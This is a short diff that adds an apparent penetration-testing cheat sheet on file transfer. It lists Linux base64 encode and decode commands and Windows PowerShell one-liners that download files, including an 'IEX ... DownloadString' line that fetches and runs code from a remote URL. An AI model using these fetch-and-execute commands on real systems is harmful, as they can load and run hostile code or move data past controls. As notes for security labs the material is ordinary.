@@ -1,0 +1,27 @@
+			-----------------------
+			 Windows File Transfer
+			-----------------------
+
+
+=========
+= Linux =
+=========
+
+cat <file> | base64 -w 0;echo
+
+base64 -d <file>
+
+===========
+= Windows =
+===========
+
+[IO.File]::WriteAllBytes("outfile.txt", [Convert]::FromBase64String("string"))
+
+(New-Object Net.WebClient).DownloadFile('<Target File URL>', '<Output File Name>')
+	# Downloads a file from a remote server
+
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>', '<Output File Name>')
+	# Downloads a file from a remote server asynchronously
+
+IEX (New-Object Net.WebClient).DownloadString('<url>')
+	# Executes code from a remote server
